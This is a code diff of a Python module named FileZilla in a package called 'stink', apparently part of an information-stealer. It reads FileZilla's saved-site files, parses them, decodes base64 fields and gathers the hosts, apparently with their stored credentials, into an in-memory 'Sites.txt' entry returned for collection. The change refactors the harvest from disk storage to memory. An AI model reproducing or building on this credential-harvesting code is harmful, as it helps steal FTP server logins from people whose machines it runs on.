@@ -1,7 +1,9 @@
+from typing import List
+from os import listdir, path
 from base64 import b64decode
 from xml.etree import ElementTree
-from os import listdir, path, makedirs
 
+from stink.helpers import MemoryStorage
 from stink.helpers.config import FileZillaConfig
 
 
@@ -9,23 +11,11 @@ class FileZilla:
     """
     Collects hosts from the FileZilla.
     """
-    def __init__(self, storage_path: str, folder: str):
+    def __init__(self, folder: str):
 
-        self.__full_path = path.join(storage_path, folder)
+        self.__file = path.join(folder, "Sites.txt")
         self.__config = FileZillaConfig()
-
-    def __create_folder(self) -> None:
-        """
-        Creates storage for the FileZilla module.
-
-        Parameters:
-        - None.
-
-        Returns:
-        - None.
-        """
-        if not path.exists(self.__full_path):
-            makedirs(self.__full_path)
+        self.__storage = MemoryStorage()
 
     def __get_hosts(self) -> None:
         """
@@ -38,6 +28,7 @@ class FileZilla:
         - None.
         """
         if not path.exists(self.__config.SitesPath):
+            print(f"[FileZilla]: No FileZilla found")
             return
 
         files = listdir(self.__config.SitesPath)
@@ -45,8 +36,6 @@ class FileZilla:
 
         if not any(file in data_files for file in files):
             return
-
-        self.__create_folder()
 
         temp = []
 
@@ -73,12 +62,12 @@ class FileZilla:
             except Exception as e:
                 print(f"[FileZilla]: {file} - {repr(e)}")
 
-        with open(path.join(self.__full_path, "Sites.txt"), "a", encoding="utf-8") as file_zilla:
-            file_zilla.write("".join(item for item in temp))
+        self.__storage.add_from_memory(
+            self.__file,
+            "".join(item for item in temp)
+        )
 
-        file_zilla.close()
-
-    def run(self) -> None:
+    def run(self) -> List:
         """
         Launches the FileZilla hosts collection module.
 
@@ -91,6 +80,8 @@ class FileZilla:
         try:
 
             self.__get_hosts()
+
+            return self.__storage.get_data()
 
         except Exception as e:
             print(f"[FileZilla]: {repr(e)}")
